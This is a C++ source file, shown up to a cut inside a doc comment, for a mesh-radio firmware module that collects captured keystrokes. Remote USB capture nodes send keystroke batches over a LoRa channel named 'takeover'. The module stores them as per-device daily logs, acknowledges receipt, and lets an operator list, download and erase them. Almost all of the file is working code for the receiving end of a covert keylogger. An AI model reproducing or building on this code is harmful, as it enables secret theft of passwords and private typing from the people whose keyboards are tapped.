/**
 * @file KeylogReceiverModule.cpp
 * @brief Keylog receiver module implementation for Heltec V4 base station
 *
 * v7.7 - Web UI Only: Removed serial/mesh command handling.
 * File browsing, download, and delete operations are now handled
 * exclusively through the HTTP Web UI at /keylogs.html
 *
 * NASA Power of 10 Compliance:
 *  - Rule 1: Simple control flow (no goto, setjmp, recursion)
 *  - Rule 2: All loops have fixed upper bounds
 *  - Rule 3: No dynamic memory after init
 *  - Rule 4: Assertions verify all assumptions
 *  - Rule 5: Data declared at smallest scope
 *  - Rule 6: All return values checked
 *  - Rule 7: Limited pointer dereferencing
 *  - Rule 8: Preprocessor used sparingly
 *  - Rule 9: Limited function pointer use
 *  - Rule 10: Compile with all warnings enabled
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#include "configuration.h"

#ifdef KEYLOG_RECEIVER_ENABLED

#include "KeylogReceiverModule.h"
#include "MeshService.h"
#include "Router.h"
#include "FSCommon.h"
#include "gps/RTC.h"
#include <cassert>

// Module instance
KeylogReceiverModule *keylogReceiverModule = nullptr;

// Base directory for keylog storage
static const char *KEYLOG_BASE_DIR = "/keylogs";

KeylogReceiverModule::KeylogReceiverModule()
    : SinglePortModule("keylog", static_cast<meshtastic_PortNum>(KEYLOG_RECEIVER_PORTNUM)),
      concurrency::OSThread("KeylogReceiver"),
      totalBatchesReceived(0),
      totalBatchesStored(0),
      totalAcksSent(0),
      storageErrors(0),
      lastStatsLog(0),
      duplicatesDetected(0),
      lastDedupSave(0),
      dedupCacheDirty(false)
{
    // NASA Rule 4: Assert invariants at construction
    assert(KEYLOG_MAX_PATH_LEN >= 64);
    assert(KEYLOG_ACK_BUFFER_SIZE >= 16);

    // Initialize dedup cache to empty (NASA Rule 3: no dynamic allocation)
    memset(dedupCache, 0, sizeof(dedupCache));
}

bool KeylogReceiverModule::init()
{
    LOG_INFO("[KeylogReceiver] Initializing keylog receiver module");

    // Create base directory if it doesn't exist
    if (!FSCom.exists(KEYLOG_BASE_DIR)) {
        if (!FSCom.mkdir(KEYLOG_BASE_DIR)) {
            LOG_ERROR("[KeylogReceiver] Failed to create %s directory", KEYLOG_BASE_DIR);
            return false;
        }
        LOG_INFO("[KeylogReceiver] Created %s directory", KEYLOG_BASE_DIR);
    }

    // Load dedup cache from flash (or start fresh)
    if (loadDedupCache()) {
        LOG_INFO("[KeylogReceiver] Loaded dedup cache from flash");
    } else {
        LOG_INFO("[KeylogReceiver] Starting with fresh dedup cache");
    }

    LOG_INFO("[KeylogReceiver] Module initialized - Web UI at /keylogs.html");
    return true;
}

int32_t KeylogReceiverModule::runOnce()
{
    // Periodically save dedup cache if dirty
    saveDedupCacheIfNeeded();

    // Check every 5 seconds
    return 5000;
}

ProcessMessage KeylogReceiverModule::handleReceived(const meshtastic_MeshPacket &mp)
{
    // NASA Rule 4: Validate all inputs with assertions
    assert(mp.decoded.payload.size <= KEYLOG_MAX_PAYLOAD_SIZE);

    // Only process port 490 packets
    if (mp.decoded.portnum != KEYLOG_RECEIVER_PORTNUM) {
        return ProcessMessage::CONTINUE;
    }

    // Only process packets on channel 1 "takeover"
    // This filters out any packets on other channels using the same port
    if (mp.channel != KEYLOG_RECEIVER_CHANNEL) {
        return ProcessMessage::CONTINUE;
    }

    const uint8_t *payload = mp.decoded.payload.bytes;
    const size_t payloadLen = mp.decoded.payload.size;

    // NASA Rule 6: Check bounds before processing
    if (payloadLen < KEYLOG_BATCH_HEADER_SIZE) {
        LOG_WARN("[KeylogReceiver] Payload too small: %u bytes", payloadLen);
        return ProcessMessage::CONTINUE;
    }

    // Check if this is an ACK response (starts with "ACK:")
    // ACK responses are for the sender, not for us to process
    if (payloadLen >= 4 && payload[0] == 'A' && payload[1] == 'C' &&
        payload[2] == 'K' && payload[3] == ':') {
        // This is an ACK, not a batch - let it pass through
        return ProcessMessage::CONTINUE;
    }

    // Check if this is a KEYLOG command (v7.9 - TCP Commands)
    // Format: "KEYLOG:<command>[:<parameters>]"
    if (payloadLen >= 7 && payload[0] == 'K' && payload[1] == 'E' &&
        payload[2] == 'Y' && payload[3] == 'L' && payload[4] == 'O' &&
        payload[5] == 'G' && payload[6] == ':') {

        // Parse and execute KEYLOG command
        KeylogCommand cmd = parseKeylogCommand(payload, payloadLen);
        if (cmd != KEYLOG_CMD_UNKNOWN) {
            // Allocate response buffer (8KB for file content)
            char *response = new char[KEYLOG_MAX_RESPONSE_SIZE];
            if (response != nullptr) {
                size_t responseLen = executeKeylogCommand(cmd, payload, payloadLen,
                                                          response, KEYLOG_MAX_RESPONSE_SIZE);
                if (responseLen > 0) {
                    // Send response back to originator (iOS via TCP), not broadcast
                    sendCommandResponse(response, responseLen, mp.from);
                }
                delete[] response;
            } else {
                LOG_ERROR("[KeylogReceiver] Failed to allocate response buffer");
            }
        }
        return ProcessMessage::STOP;  // Don't process as batch
    }

    // Check if this is a command response (plain text, not binary batch)
    // Command responses are text strings like "USB Capture STOPPED", "FRAM: X batches..."
    // They don't have the magic marker (0x55 0x4B) and aren't binary batch format
    // Let these pass through to iOS/TCP clients
    bool mightBeText = true;
    for (size_t i = 0; i < payloadLen && i < 32; i++) {
        uint8_t c = payload[i];
        // Allow printable ASCII and common whitespace (space, tab, newline, carriage return)
        if (!((c >= 0x20 && c <= 0x7E) || c == '\t' || c == '\n' || c == '\r')) {
            mightBeText = false;
            break;
        }
    }

    // If payload looks like text and doesn't have binary batch header, it's a command response
    bool hasProtocolMagic = (payloadLen >= 2 &&
                             payload[0] == KEYLOG_PROTOCOL_MAGIC_0 &&
                             payload[1] == KEYLOG_PROTOCOL_MAGIC_1);

    if (mightBeText && !hasProtocolMagic) {
        LOG_INFO("[KeylogReceiver] Command response detected, passing through to iOS");
        return ProcessMessage::CONTINUE;
    }

    totalBatchesReceived++;

    /* REQ-PROTO-001: Detect protocol format using magic marker
     * New format (v1.0+): [magic:2][version:2][batch_id:4][data:N]
     * Old format (legacy): [batch_id:4][data:N]
     * Detection: If bytes[0..1] == 0x55 0x4B ("UK"), it's new format */
    bool isNewFormat = (payloadLen >= KEYLOG_NEW_HEADER_SIZE &&
                        payload[0] == KEYLOG_PROTOCOL_MAGIC_0 &&
                        payload[1] == KEYLOG_PROTOCOL_MAGIC_1);

    uint32_t batchId = 0;
    const uint8_t *keystrokeData = nullptr;
    size_t keystrokeLen = 0;
    uint8_t protocolMajor = 0;
    uint8_t protocolMinor = 0;

    if (isNewFormat) {
        /* New format: batch_id at offset 4, data at offset 8 */
        protocolMajor = payload[2];
        protocolMinor = payload[3];

        /* Extract batch_id (little-endian at offset 4) */
        batchId |= ((uint32_t)payload[4]);
        batchId |= ((uint32_t)payload[5]) << 8;
        batchId |= ((uint32_t)payload[6]) << 16;
        batchId |= ((uint32_t)payload[7]) << 24;

        keystrokeData = payload + KEYLOG_NEW_HEADER_SIZE;
        keystrokeLen = payloadLen - KEYLOG_NEW_HEADER_SIZE;

        LOG_INFO("[KeylogReceiver] Batch 0x%08lX from !%08x v%u.%u (%u bytes)",
                 (unsigned long)batchId, mp.from, protocolMajor, protocolMinor, keystrokeLen);
    } else {
        /* Old format (legacy): batch_id at offset 0, data at offset 4 */
        batchId |= ((uint32_t)payload[0]);
        batchId |= ((uint32_t)payload[1]) << 8;
        batchId |= ((uint32_t)payload[2]) << 16;
        batchId |= ((uint32_t)payload[3]) << 24;

        keystrokeData = payload + KEYLOG_BATCH_HEADER_SIZE;
        keystrokeLen = payloadLen - KEYLOG_BATCH_HEADER_SIZE;

        LOG_INFO("[KeylogReceiver] Batch 0x%08lX from !%08x (legacy format, %u bytes)",
                 (unsigned long)batchId, mp.from, keystrokeLen);
    }

    // Check for duplicate BEFORE storing (handles retransmissions when ACK was lost)
    if (isDuplicateBatch(mp.from, batchId)) {
        duplicatesDetected++;
        LOG_INFO("[KeylogReceiver] Duplicate batch 0x%08lX from !%08x (already stored)",
                 (unsigned long)batchId, mp.from);

        // Still send ACK so sender can clear its FRAM
        if (sendAck(mp.from, batchId)) {
            totalAcksSent++;
            LOG_DEBUG("[KeylogReceiver] Re-sent ACK for duplicate batch 0x%08lX", (unsigned long)batchId);
        }
        return ProcessMessage::STOP;
    }

    // Store to flash
    bool stored = storeKeystrokeBatch(mp.from, batchId, keystrokeData, keystrokeLen);

    if (stored) {
        totalBatchesStored++;

        // Record in dedup cache AFTER successful store
        recordReceivedBatch(mp.from, batchId);

        // Debounced save to flash
        saveDedupCacheIfNeeded();

        // Send ACK back to sender
        if (sendAck(mp.from, batchId)) {
            totalAcksSent++;
            LOG_INFO("[KeylogReceiver] ACK sent for batch 0x%08lX", (unsigned long)batchId);
        } else {
            LOG_ERROR("[KeylogReceiver] Failed to send ACK for batch 0x%08lX", (unsigned long)batchId);
        }
    } else {
        storageErrors++;
        LOG_ERROR("[KeylogReceiver] Failed to store batch 0x%08lX", (unsigned long)batchId);
    }

    // Log stats periodically
    uint32_t now = millis();
    if (now - lastStatsLog >= KEYLOG_STATS_LOG_INTERVAL_MS) {
        lastStatsLog = now;
        LOG_INFO("[KeylogReceiver] Stats: rx=%lu stored=%lu acks=%lu errors=%lu dups=%lu",
                 (unsigned long)totalBatchesReceived,
                 (unsigned long)totalBatchesStored,
                 (unsigned long)totalAcksSent,
                 (unsigned long)storageErrors,
                 (unsigned long)duplicatesDetected);
    }

    return ProcessMessage::STOP;
}

bool KeylogReceiverModule::storeKeystrokeBatch(NodeNum from, uint32_t batchId,
                                                const uint8_t *data, size_t len)
{
    // NASA Rule 4: Validate inputs
    assert(data != nullptr || len == 0);
    assert(len <= KEYLOG_MAX_PAYLOAD_SIZE);

    // Ensure node directory exists
    if (!ensureNodeDirectory(from)) {
        LOG_ERROR("[KeylogReceiver] Failed to create directory for node !%08x", from);
        return false;
    }

    // Get log file path
    char pathBuf[KEYLOG_MAX_PATH_LEN];
    if (!getLogFilePath(from, pathBuf)) {
        LOG_ERROR("[KeylogReceiver] Failed to generate path for node !%08x", from);
        return false;
    }

    // Open file in append mode
    // NASA Rule 6: Check return value
    File file = FSCom.open(pathBuf, "a");
    if (!file) {
        LOG_ERROR("[KeylogReceiver] Failed to open %s for writing", pathBuf);
        return false;
    }

    // Write batch header with timestamp
    uint32_t timestamp = getValidTime(RTCQualityFromNet);
    int headerLen = file.printf("\n--- Batch 0x%08lX at %lu ---\n",
                                 (unsigned long)batchId, (unsigned long)timestamp);
    if (headerLen <= 0) {
        LOG_ERROR("[KeylogReceiver] Failed to write batch header");
        file.close();
        return false;
    }

    // Write keystroke data
    // NASA Rule 2: Fixed upper bound on write
    size_t written = 0;
    if (len > 0) {
        written = file.write(data, len);
    }

    // Add newline after data
    file.println();

    // Flush and close
    file.flush();
    file.close();

    if (written != len) {
        LOG_ERROR("[KeylogReceiver] Partial write: %u of %u bytes", written, len);
        return false;
    }

    LOG_DEBUG("[KeylogReceiver] Stored %u bytes to %s", len, pathBuf);
    return true;
}

bool KeylogReceiverModule::ensureNodeDirectory(NodeNum nodeId)
{
    // Build directory path: /keylogs/<node_hex>/
    char dirPath[KEYLOG_MAX_PATH_LEN];

    // NASA Rule 6: Check snprintf return
    int pathLen = snprintf(dirPath, sizeof(dirPath), "%s/%08x", KEYLOG_BASE_DIR, nodeId);
    if (pathLen < 0 || pathLen >= (int)sizeof(dirPath)) {
        LOG_ERROR("[KeylogReceiver] Directory path overflow");
        return false;
    }

    // Check if exists
    if (FSCom.exists(dirPath)) {
        return true;
    }

    // Create directory
    if (!FSCom.mkdir(dirPath)) {
        LOG_ERROR("[KeylogReceiver] Failed to create directory %s", dirPath);
        return false;
    }

    LOG_INFO("[KeylogReceiver] Created directory %s", dirPath);
    return true;
}

bool KeylogReceiverModule::getLogFilePath(NodeNum nodeId, char *pathBuf)
{
    // NASA Rule 4: Validate output buffer
    assert(pathBuf != nullptr);

    // Get current date for filename
    uint32_t timestamp = getValidTime(RTCQualityFromNet);

    // Convert to date components
    // Using simple day calculation (days since epoch)
    // For proper date formatting, we'd need time.h but this is simpler
    uint32_t days = timestamp / 86400;
    uint32_t year = 1970;
    uint32_t month = 1;
    uint32_t day = 1;

    // NASA Rule 2: Fixed upper bound on loop iterations
    // Calculate year (max 200 iterations covers 1970-2170)
    for (uint32_t i = 0; i < 200 && days >= 365; i++) {
        bool leap = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
        uint32_t daysInYear = leap ? 366 : 365;
        if (days >= daysInYear) {
            days -= daysInYear;
            year++;
        } else {
            break;
        }
    }

    // Days in each month (non-leap year default)
    static const uint8_t daysInMonth[12] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};

    // Calculate month (max 12 iterations)
    for (uint32_t m = 0; m < 12 && days >= daysInMonth[m]; m++) {
        uint32_t dim = daysInMonth[m];
        // Adjust February for leap year
        if (m == 1) {
            bool leap = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
            if (leap) {
                dim = 29;
            }
        }
        if (days >= dim) {
            days -= dim;
            month++;
        } else {
            break;
        }
    }
    day = days + 1;

    // Build path: /keylogs/<node_hex>/keylog_YYYY-MM-DD.txt
    int pathLen = snprintf(pathBuf, KEYLOG_MAX_PATH_LEN,
                           "%s/%08x/keylog_%04lu-%02lu-%02lu.txt",
                           KEYLOG_BASE_DIR, nodeId,
                           (unsigned long)year, (unsigned long)month, (unsigned long)day);

    // NASA Rule 6: Check for truncation
    if (pathLen < 0 || pathLen >= KEYLOG_MAX_PATH_LEN) {
        LOG_ERROR("[KeylogReceiver] Path truncated");
        return false;
    }

    return true;
}

/* v7.5: Broadcast ACK with sender ID to bypass PKI encryption issue
 * Format: "ACK:0x{batch_id}:!{receiver_node}" allows multi-XIAO support
 * Broadcasts never use PKI (Router.cpp:614), solving the decryption failure */
bool KeylogReceiverModule::sendAck(NodeNum to, uint32_t batchId)
{
    // NASA Rule 4: Validate original sender (for logging only, we broadcast anyway)
    if (to == 0) {
        LOG_ERROR("[KeylogReceiver] Invalid original sender: %08x", to);
        return false;
    }

    // Build ACK string with sender ID: "ACK:0x12345678:!a1b2c3d4"
    // Format enables multi-XIAO deployments to filter ACKs by receiver node
    char ackBuf[KEYLOG_ACK_BUFFER_SIZE];
    int ackLen = snprintf(ackBuf, sizeof(ackBuf), "ACK:0x%08lX:!%08x",
                          (unsigned long)batchId, nodeDB->getNodeNum());

    // NASA Rule 6: Check for truncation
    if (ackLen < 0 || ackLen >= (int)sizeof(ackBuf)) {
        LOG_ERROR("[KeylogReceiver] ACK buffer overflow");
        return false;
    }

    // Allocate packet
    meshtastic_MeshPacket *reply = allocDataPacket();
    if (reply == nullptr) {
        LOG_ERROR("[KeylogReceiver] Failed to allocate ACK packet");
        return false;
    }

    // Configure packet (v7.5: broadcast to bypass PKI encryption)
    reply->to = NODENUM_BROADCAST;  // Broadcast - bypasses PKI entirely
    reply->channel = KEYLOG_RECEIVER_CHANNEL;
    reply->decoded.portnum = static_cast<meshtastic_PortNum>(KEYLOG_RECEIVER_PORTNUM);
    reply->want_ack = false;  // ACK doesn't need ACK
    reply->priority = meshtastic_MeshPacket_Priority_HIGH;

    // Copy ACK payload
    // NASA Rule 4: Assert bounds
    assert((size_t)ackLen < sizeof(reply->decoded.payload.bytes));
    memcpy(reply->decoded.payload.bytes, ackBuf, ackLen + 1);
    reply->decoded.payload.size = ackLen;

    // Send packet
    service->sendToMesh(reply, RX_SRC_LOCAL, true);

    LOG_DEBUG("[KeylogReceiver] Broadcast ACK for !%08x: %s", to, ackBuf);
    return true;
}

// ==================== Deduplication Implementation ====================

/**
 * @brief Check if batch was already received from this node
 * NASA Rule 1: No recursion, simple control flow
 * NASA Rule 2: Fixed loop bounds (DEDUP_MAX_NODES, DEDUP_BATCHES_PER_NODE)
 * NASA Rule 4: Assertions verify assumptions
 */
bool KeylogReceiverModule::isDuplicateBatch(NodeNum from, uint32_t batchId)
{
    // NASA Rule 4: Validate input
    assert(from != 0);
    assert(from != NODENUM_BROADCAST);

    // NASA Rule 2: Fixed upper bound (16 nodes max)
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId == from) {
            // Found node entry, search its recent batches
            // NASA Rule 2: Fixed upper bound (16 batches max)
            uint8_t searchCount = (dedupCache[i].count < DEDUP_BATCHES_PER_NODE)
                                  ? dedupCache[i].count : DEDUP_BATCHES_PER_NODE;
            for (uint8_t j = 0; j < searchCount; j++) {
                if (dedupCache[i].recentBatchIds[j] == batchId) {
                    return true;  // Duplicate!
                }
            }
            return false;  // Node found but batch not in history
        }
    }
    return false;  // Node not found = definitely new
}

/**
 * @brief Record a received batch in the dedup cache
 * NASA Rule 3: No dynamic allocation (uses fixed cache)
 * NASA Rule 5: Variables at smallest scope
 * NASA Rule 7: Limited pointer dereferencing
 */
void KeylogReceiverModule::recordReceivedBatch(NodeNum from, uint32_t batchId)
{
    // NASA Rule 4: Validate input
    assert(from != 0);

    DedupNodeEntry *entry = findOrCreateNodeEntry(from);

    // NASA Rule 6: Check return value
    if (entry == nullptr) {
        LOG_WARN("[KeylogReceiver] Dedup cache: failed to get entry for !%08x", from);
        return;
    }

    // NASA Rule 4: Verify entry is valid
    assert(entry->nextIdx < DEDUP_BATCHES_PER_NODE);

    // Add to circular buffer
    entry->recentBatchIds[entry->nextIdx] = batchId;
    entry->nextIdx = (entry->nextIdx + 1) % DEDUP_BATCHES_PER_NODE;
    if (entry->count < DEDUP_BATCHES_PER_NODE) {
        entry->count++;
    }

    dedupCacheDirty = true;
}

/**
 * @brief Find existing node entry or create new one (LRU eviction if full)
 * NASA Rule 1: No recursion
 * NASA Rule 2: Fixed loop bounds
 * NASA Rule 7: Returns pointer to static array element (no heap)
 */
DedupNodeEntry *KeylogReceiverModule::findOrCreateNodeEntry(NodeNum nodeId)
{
    // NASA Rule 4: Validate input
    assert(nodeId != 0);

    // NASA Rule 5: Variables at smallest scope
    uint32_t now = millis() / 1000;

    // First pass: find existing entry
    // NASA Rule 2: Fixed upper bound
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId == nodeId) {
            dedupCache[i].lastAccessTime = now;  // Update LRU
            return &dedupCache[i];
        }
    }

    // Second pass: find empty slot
    // NASA Rule 2: Fixed upper bound
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId == 0) {
            dedupCache[i].nodeId = nodeId;
            dedupCache[i].lastAccessTime = now;
            dedupCache[i].nextIdx = 0;
            dedupCache[i].count = 0;
            dedupCacheDirty = true;
            LOG_DEBUG("[KeylogReceiver] Dedup: new entry for node !%08x", nodeId);
            return &dedupCache[i];
        }
    }

    // Cache full - evict LRU (least recently used)
    uint8_t lruIdx = 0;
    uint32_t oldestTime = dedupCache[0].lastAccessTime;

    // NASA Rule 2: Fixed upper bound
    for (uint8_t i = 1; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].lastAccessTime < oldestTime) {
            oldestTime = dedupCache[i].lastAccessTime;
            lruIdx = i;
        }
    }

    // NASA Rule 4: Verify index bounds
    assert(lruIdx < DEDUP_MAX_NODES);

    LOG_INFO("[KeylogReceiver] Evicting LRU node !%08x from dedup cache",
             dedupCache[lruIdx].nodeId);

    // Reset and reuse
    memset(&dedupCache[lruIdx], 0, sizeof(DedupNodeEntry));
    dedupCache[lruIdx].nodeId = nodeId;
    dedupCache[lruIdx].lastAccessTime = now;
    dedupCacheDirty = true;
    return &dedupCache[lruIdx];
}

/**
 * @brief Load dedup cache from flash filesystem
 * NASA Rule 6: All return values checked
 * NASA Rule 3: Uses fixed-size buffer (no heap)
 */
bool KeylogReceiverModule::loadDedupCache()
{
    // NASA Rule 6: Check file open
    File f = FSCom.open(DEDUP_CACHE_FILE, "r");
    if (!f) {
        return false;  // File doesn't exist - fresh start
    }

    // NASA Rule 6: Check read result
    DedupCacheHeader header;
    size_t headerRead = f.read((uint8_t *)&header, sizeof(header));
    if (headerRead != sizeof(header)) {
        LOG_WARN("[KeylogReceiver] Dedup cache header read failed");
        f.close();
        return false;
    }

    // Validate magic number and version
    if (header.magic != DEDUP_CACHE_MAGIC || header.version != DEDUP_CACHE_VERSION) {
        LOG_WARN("[KeylogReceiver] Dedup cache invalid (magic=0x%04X, ver=%u)",
                 header.magic, header.version);
        f.close();
        return false;
    }

    // NASA Rule 6: Check read result
    size_t bytesRead = f.read((uint8_t *)dedupCache, sizeof(dedupCache));
    f.close();

    if (bytesRead != sizeof(dedupCache)) {
        LOG_WARN("[KeylogReceiver] Dedup cache truncated (%u/%u bytes)",
                 (unsigned)bytesRead, (unsigned)sizeof(dedupCache));
        memset(dedupCache, 0, sizeof(dedupCache));
        return false;
    }

    LOG_INFO("[KeylogReceiver] Dedup cache loaded (%lu nodes)",
             (unsigned long)header.nodeCount);
    return true;
}

/**
 * @brief Save dedup cache to flash filesystem
 * NASA Rule 6: All return values checked
 * NASA Rule 2: Fixed loop bound for counting nodes
 */
bool KeylogReceiverModule::saveDedupCache()
{
    // NASA Rule 6: Check file open
    File f = FSCom.open(DEDUP_CACHE_FILE, "w");
    if (!f) {
        LOG_ERROR("[KeylogReceiver] Failed to open dedup cache for writing");
        return false;
    }

    // Count active nodes
    // NASA Rule 2: Fixed upper bound
    uint32_t nodeCount = 0;
    for (uint8_t i = 0; i < DEDUP_MAX_NODES; i++) {
        if (dedupCache[i].nodeId != 0) {
            nodeCount++;
        }
    }

    // Write header
    DedupCacheHeader header;
    header.magic = DEDUP_CACHE_MAGIC;
    header.version = DEDUP_CACHE_VERSION;
    header.nodeCount = nodeCount;

    // NASA Rule 6: Check write result
    size_t headerWritten = f.write((uint8_t *)&header, sizeof(header));
    if (headerWritten != sizeof(header)) {
        LOG_ERROR("[KeylogReceiver] Dedup cache header write failed");
        f.close();
        return false;
    }

    // NASA Rule 6: Check write result
    size_t cacheWritten = f.write((uint8_t *)dedupCache, sizeof(dedupCache));
    if (cacheWritten != sizeof(dedupCache)) {
        LOG_ERROR("[KeylogReceiver] Dedup cache data write failed");
        f.close();
        return false;
    }

    f.flush();
    f.close();

    dedupCacheDirty = false;
    LOG_DEBUG("[KeylogReceiver] Dedup cache saved (%lu nodes)", (unsigned long)nodeCount);
    return true;
}

/**
 * @brief Save cache if dirty and debounce interval elapsed
 * NASA Rule 1: Simple control flow (early returns)
 */
void KeylogReceiverModule::saveDedupCacheIfNeeded()
{
    if (!dedupCacheDirty) {
        return;
    }

    uint32_t now = millis();
    if (now - lastDedupSave < DEDUP_SAVE_INTERVAL_MS) {
        return;  // Debounce - don't save too frequently
    }

    // NASA Rule 6: Check but don't fail on save error (cache still in RAM)
    if (!saveDedupCache()) {
        LOG_WARN("[KeylogReceiver] Dedup cache save failed, will retry");
    }
    lastDedupSave = now;
}

// ==================== Command Handling Implementation (v7.9 - TCP Commands) ====================

/**
 * @brief Parse KEYLOG command from payload
 * NASA Rule 1: Simple control flow
 * NASA Rule 6: Validates input bounds
 */
KeylogCommand KeylogReceiverModule::parseKeylogCommand(const uint8_t *payload, size_t len)
{
    // NASA Rule 4: Validate inputs
    assert(payload != nullptr);
    assert(len >= 7);  // Minimum "KEYLOG:"

    // Skip "KEYLOG:" prefix (7 bytes)
    const char *cmdStart = (const char *)(payload + 7);
    size_t cmdLen = len - 7;

    // NASA Rule 6: Validate bounds
    if (cmdLen == 0 || cmdLen > KEYLOG_MAX_COMMAND_LEN) {
        LOG_WARN("[KeylogReceiver] Command length invalid: %u", cmdLen);
        return KEYLOG_CMD_UNKNOWN;
    }

    // Log the command being parsed
    char cmdBuf[32];
    size_t copyLen = (cmdLen < sizeof(cmdBuf) - 1) ? cmdLen : sizeof(cmdBuf) - 1;
    memcpy(cmdBuf, cmdStart, copyLen);
    cmdBuf[copyLen] = '\0';
    LOG_INFO("[KeylogReceiver] Parsing KEYLOG command: '%s' (len=%u)", cmdBuf, cmdLen);

    // Compare commands (NASA Rule 1: simple if-else chain)
    // Check exact matches first (LIST and STATS have no parameters)
    if (cmdLen == 4 && strncmp(cmdStart, "LIST", 4) == 0) {
        LOG_INFO("[KeylogReceiver] Matched: KEYLOG_CMD_LIST");
        return KEYLOG_CMD_LIST;
    }
    else if (cmdLen == 5 && strncmp(cmdStart, "STATS", 5) == 0) {
        LOG_INFO("[KeylogReceiver] Matched: KEYLOG_CMD_STATS");
        return KEYLOG_CMD_STATS;
    }
    else if (cmdLen >= 4 && strncmp(cmdStart, "GET:", 4) == 0) {
        LOG_INFO("[KeylogReceiver] Matched: KEYLOG_CMD_GET");
        return KEYLOG_CMD_GET;
    }
    else if (cmdLen >= 7 && strncmp(cmdStart, "DELETE:", 7) == 0) {
        LOG_INFO("[KeylogReceiver] Matched: KEYLOG_CMD_DELETE");
        return KEYLOG_CMD_DELETE;
    }
    else if (cmdLen >= 9 && strncmp(cmdStart, "ERASE_ALL", 9) == 0) {
        LOG_INFO("[KeylogReceiver] Matched: KEYLOG_CMD_ERASE_ALL");
        return KEYLOG_CMD_ERASE_ALL;
    }

    LOG_WARN("[KeylogReceiver] Unknown KEYLOG command: '%s'", cmdBuf);
    return KEYLOG_CMD_UNKNOWN;
}

/**
 * @brief Execute KEYLOG command and generate response
 * NASA Rule 2: Fixed loop bounds in all handlers
 * NASA Rule 6: All return values checked
 */
size_t KeylogReceiverModule::executeKeylogCommand(KeylogCommand cmd, const uint8_t *payload, size_t payloadLen,
                                                  char *response, size_t maxLen)
{
    // NASA Rule 4: Validate inputs
    assert(payload != nullptr);
    assert(response != nullptr);
    assert(maxLen > 0);

    switch (cmd) {
        case KEYLOG_CMD_LIST:
            return handleListCommand(response, maxLen);

        case KEYLOG_CMD_GET: {
            // Parse "KEYLOG:GET:<nodeId>:<filename>"
            const char *params = (const char *)(payload + 11);  // Skip "KEYLOG:GET:"
            size_t paramsLen = payloadLen - 11;

            // Find first colon (separates nodeId from filename)
            const char *colonPos = (const char *)memchr(params, ':', paramsLen);
            if (colonPos == nullptr) {
                snprintf(response, maxLen, "Error: Invalid GET format (expected KEYLOG:GET:<nodeId>:<filename>)");
                return strlen(response);
            }

            size_t nodeIdLen = colonPos - params;
            const char *filename = colonPos + 1;
            size_t filenameLen = paramsLen - nodeIdLen - 1;

            // Validate lengths
            if (nodeIdLen != 8 || filenameLen == 0 || filenameLen > KEYLOG_MAX_FILENAME_LEN) {
                snprintf(response, maxLen, "Error: Invalid nodeId or filename length");
                return strlen(response);
            }

            // Extract nodeId and filename (null-terminate)
            char nodeId[9];
            char filenameBuf[KEYLOG_MAX_FILENAME_LEN + 1];
            memcpy(nodeId, params, 8);
            nodeId[8] = '\0';
            memcpy(filenameBuf, filename, filenameLen);
            filenameBuf[filenameLen] = '\0';

            return handleGetCommand(nodeId, filenameBuf, response, maxLen);
        }

        case KEYLOG_CMD_DELETE: {
            // Parse "KEYLOG:DELETE:<nodeId>:<filename>"
            const char *params = (const char *)(payload + 14);  // Skip "KEYLOG:DELETE:"
            size_t paramsLen = payloadLen - 14;

            // Find first colon
            const char *colonPos = (const char *)memchr(params, ':', paramsLen);
            if (colonPos == nullptr) {
                snprintf(response, maxLen, "Error: Invalid DELETE format");
                return strlen(response);
            }

            size_t nodeIdLen = colonPos - params;
            const char *filename = colonPos + 1;
            size_t filenameLen = paramsLen - nodeIdLen - 1;

            // Validate lengths
            if (nodeIdLen != 8 || filenameLen == 0 || filenameLen > KEYLOG_MAX_FILENAME_LEN) {
                snprintf(response, maxLen, "Error: Invalid nodeId or filename length");
                return strlen(response);
            }

            // Extract nodeId and filename
            char nodeId[9];
            char filenameBuf[KEYLOG_MAX_FILENAME_LEN + 1];
            memcpy(nodeId, params, 8);
            nodeId[8] = '\0';
            memcpy(filenameBuf, filename, filenameLen);
            filenameBuf[filenameLen] = '\0';

            return handleDeleteCommand(nodeId, filenameBuf, response, maxLen);
        }

        case KEYLOG_CMD_STATS:
            return handleStatsCommand(response, maxLen);

        case KEYLOG_CMD_ERASE_ALL:
            return handleEraseAllCommand(response, maxLen);

        default:
            snprintf(response, maxLen, "Error: Unknown KEYLOG command");
            return strlen(response);
    }
}

/**
 * @brief Send command response back to originator
 * NASA Rule 6: Validates buffer size
 */
bool KeylogReceiverModule::sendCommandResponse(const char *response, size_t len, NodeNum to)
{
    // NASA Rule 4: Validate inputs
    assert(response != nullptr);
    assert(len > 0);

    // If 'to' is 0 (iOS via TCP has no real node number), send to ourselves
    // The Router will detect RX_SRC_LOCAL and route back via TCP
    if (to == 0) {
        to = nodeDB->getNodeNum();  // Send to ourselves, Router routes to TCP
        LOG_DEBUG("[KeylogReceiver] Command from TCP (fr=0x0), routing to self for TCP return");
    }

    // Allocate packet
    meshtastic_MeshPacket *reply = allocDataPacket();
    if (reply == nullptr) {
        LOG_ERROR("[KeylogReceiver] Failed to allocate response packet");
        return false;
    }

    // Configure packet (direct message back to originator - iOS via TCP)
    reply->to = to;  // Send back to command originator (or self for TCP routing)
    reply->channel = KEYLOG_RECEIVER_CHANNEL;
    reply->decoded.portnum = static_cast<meshtastic_PortNum>(KEYLOG_RECEIVER_PORTNUM);
    reply->want_ack = false;
    reply->priority = meshtastic_MeshPacket_Priority_DEFAULT;

    // Copy response payload (truncate if needed)
    size_t copyLen = (len < sizeof(reply->decoded.payload.bytes)) ? len : sizeof(reply->decoded.payload.bytes) - 1;
    memcpy(reply->decoded.payload.bytes, response, copyLen);
    reply->decoded.payload.bytes[copyLen] = '\0';  // Null terminate
    reply->decoded.payload.size = copyLen;

    // Send packet (RX_SRC_LOCAL means it came from TCP, will go back via TCP)
    service->sendToMesh(reply, RX_SRC_LOCAL, true);

    LOG_INFO("[KeylogReceiver] Sent response to !%08x (%u bytes)", to, copyLen);
    return true;
}

/**
 * @brief Handle KEYLOG:LIST command - list all nodes and files
